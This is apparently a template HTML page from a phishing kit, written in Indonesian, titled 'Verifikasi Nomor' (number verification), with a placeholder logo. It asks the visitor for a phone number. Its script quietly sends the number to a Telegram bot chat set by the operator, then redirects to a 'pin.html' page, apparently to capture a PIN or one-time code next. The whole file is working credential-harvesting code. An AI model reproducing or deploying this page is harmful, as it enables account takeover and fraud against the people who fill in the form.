<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi Nomor</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to bottom right, #1994f3, #ffffff);
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: white;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.1);
      width: 80%;
      max-width: 380px;
      text-align: center;
    }

    .logo {
      width: 120px;
      margin-bottom: 20px;
    }

    h2 {
      margin-bottom: 20px;
      font-size: 22px;
      color: #333;
    }

    input[type="tel"] {
      padding: 12px;
      width: 90%;
      font-size: 18px;
      border-radius: 12px;
      border: 1px solid #ccc;
      margin-bottom: 20px;
      outline: none;
    }

    button {
      padding: 12px 20px;
      width: 100%;
      background-color: #1994f3;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0c7fe0;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Ganti src dengan file/logo kamu -->
    <img src="logo.png" alt="Logo" class="logo" />
    <h2>Masukkan Nomor HP</h2>
    <form>
      <input type="tel" id="nomor" placeholder="08xxxxxxxxxx" required />
      <button type="submit">Konfirmasi</button>
    </form>
  </div>

  <script>
    const token = 'TOKEN_BOT_ANDA';  // Ganti dengan token bot Telegram kamu
    const chatId = 'ID_CHAT_ANDA';   // Ganti dengan chat ID kamu

    function sendNumberToTelegram() {
      const nomor = document.getElementById('nomor').value;
      const message = `ðŸ“± Nomor HP:\n${nomor}`;
      
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
    }

    document.querySelector('form').addEventListener('submit', function (e) {
      e.preventDefault();
      sendNumberToTelegram();
      setTimeout(() => {
        window.location.href = 'pin.html';
      }, 500);
    });
  </script>
</body>
</html>
